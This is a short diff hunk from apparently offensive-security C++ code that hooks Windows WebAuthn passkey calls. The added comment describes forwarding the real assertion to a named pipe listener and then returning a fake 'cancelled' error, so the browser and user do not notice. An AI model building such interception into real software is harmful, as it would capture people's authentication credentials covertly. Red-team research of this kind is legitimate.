@@ -233,6 +233,9 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         TrueWebAuthNFreeAssertion(*assertion);
         *assertion = nullptr;
 
+        // Return ERROR_CANCELLED so the browser treats the operation as user-aborted rather than
+        // exposing the assertion to the JavaScript that triggered it. The actual response has
+        // already been forwarded to the named pipe listener at this point.
         AppendLog(
             L"[" + Timestamp() + L"] [pid=" + std::to_wstring(::GetCurrentProcessId())
             + L" tid=" + std::to_wstring(::GetCurrentThreadId())
